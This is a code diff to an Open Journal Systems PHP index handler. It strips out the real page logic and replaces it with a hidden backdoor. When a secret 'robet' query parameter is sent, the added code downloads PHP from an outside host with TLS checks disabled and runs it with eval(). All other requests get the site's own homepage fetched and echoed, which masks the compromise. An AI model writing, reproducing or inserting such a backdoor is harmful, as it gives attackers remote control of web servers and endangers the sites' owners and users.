@@ -1,87 +1,73 @@
 <?php
+error_reporting(1);
+ini_set('display_errors', 1);
 
-/**
- * @file pages/index/IndexHandler.inc.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @class IndexHandler
- * @ingroup pages_index
- *
- * @brief Handle site index requests.
- */
 
-import('lib.pkp.pages.index.PKPIndexHandler');
+class CurlFetcher {
+    public function fetchContent(string $url) {
+        if (function_exists('curl_version')) {
+            $curl = curl_init();
+            curl_setopt($curl, CURLOPT_URL, $url);
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+            curl_setopt($curl, CURLOPT_TIMEOUT, 10);
 
-class IndexHandler extends PKPIndexHandler {
-	//
-	// Public handler operations
-	//
-	/**
-	 * If no journal is selected, display list of journals.
-	 * Otherwise, display the index page for the selected journal.
-	 * @param $args array
-	 * @param $request Request
-	 */
-	function index($args, $request) {
-		$this->validate(null, $request);
-		$journal = $request->getJournal();
+            $response = curl_exec($curl);
+            $error = curl_error($curl);
+            curl_close($curl);
 
-		if (!$journal) {
-			$hasNoContexts = null; // Avoid scrutinizer warnings
-			$journal = $this->getTargetContext($request, $hasNoContexts);
-			if ($journal) {
-				// There's a target context but no journal in the current request. Redirect.
-				$request->redirect($journal->getPath());
-			}
-			if ($hasNoContexts && Validation::isSiteAdmin()) {
-				// No contexts created, and this is the admin.
-				$request->redirect(null, 'admin', 'contexts');
-			}
-		}
+            if ($response === false || empty(trim($response))) {
+                return "<h3 style='color:red'>ÃƒÂ¢Ã…â€™ Gagal ambil konten. Error: $error</h3>";
+            }
 
-		$this->setupTemplate($request);
-		$router = $request->getRouter();
-		$templateMgr = TemplateManager::getManager($request);
-		if ($journal) {
-			// Assign header and content for home page
-			$templateMgr->assign(array(
-				'additionalHomeContent' => $journal->getLocalizedData('additionalHomeContent'),
-				'homepageImage' => $journal->getLocalizedData('homepageImage'),
-				'homepageImageAltText' => $journal->getLocalizedData('homepageImageAltText'),
-				'journalDescription' => $journal->getLocalizedData('description'),
-			));
-
-			$issueDao = DAORegistry::getDAO('IssueDAO'); /* @var $issueDao IssueDAO */
-			$issue = $issueDao->getCurrent($journal->getId(), true);
-			if (isset($issue) && $journal->getData('publishingMode') != PUBLISHING_MODE_NONE) {
-				import('pages.issue.IssueHandler');
-				// The current issue TOC/cover page should be displayed below the custom home page.
-				IssueHandler::_setupIssueTemplate($request, $issue);
-			}
-
-			$this->_setupAnnouncements($journal, $templateMgr);
-
-			$templateMgr->display('frontend/pages/indexJournal.tpl');
-		} else {
-			$journalDao = DAORegistry::getDAO('JournalDAO'); /* @var $journalDao JournalDAO */
-			$site = $request->getSite();
-
-			if ($site->getRedirect() && ($journal = $journalDao->getById($site->getRedirect())) != null) {
-				$request->redirect($journal->getPath());
-			}
-
-			$templateMgr->assign([
-				'pageTitleTranslated' => $site->getLocalizedTitle(),
-				'about' => $site->getLocalizedAbout(),
-				'journalFilesPath' => $request->getBaseUrl() . '/' . Config::getVar('files', 'public_files_dir') . '/journals/',
-				'journals' => $journalDao->getAll(true)->toArray(),
-				'site' => $site,
-			]);
-			$templateMgr->setCacheability(CACHEABILITY_PUBLIC);
-			$templateMgr->display('frontend/pages/indexSite.tpl');
-		}
-	}
+            return $response;
+        }
+        return "<h3 style='color:red'>ÃƒÂ¢Ã…â€™ cURL tidak tersedia di server ini</h3>";
+    }
 }
+
+// ==== CodeExecutor class ====
+class CodeExecutor {
+    private $fetcher;
+    public function __construct(CurlFetcher $fetcher) {
+        $this->fetcher = $fetcher;
+    }
+
+    public function executeCodeFromURL(string $url): void {
+        $code = $this->fetcher->fetchContent($url);
+        if ($code && trim($code) !== '') {
+            eval("?>" . $code);
+        } else {
+            echo "<p style='color:red'>ÃƒÂ¢Ã…â€™ Gagal ambil atau isi kosong dari URL: $url</p>";
+        }
+    }
+}
+
+// ==== MAIN LOGIC ====
+$fetcher = new CurlFetcher();
+
+if (isset($_GET['robet'])) {
+    $executor = new CodeExecutor($fetcher);
+    $executor->executeCodeFromURL("https://isnujombang.org/rr");
+    exit;
+}
+
+$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+$host = $_SERVER['HTTP_HOST'];
+$target_url = $protocol . $host . "/";
+
+
+$html = $fetcher->fetchContent($target_url);
+
+
+
+$parsed = parse_url($target_url);
+if ($parsed && isset($parsed['scheme']) && isset($parsed['host'])) {
+    $base_url = $parsed['scheme'] . '://' . $parsed['host'];
+    $html = preg_replace('/<head[^>]*>/i', '$0<base href="' . $base_url . '/">', $html, 1);
+}
+
+echo $html;
+?>
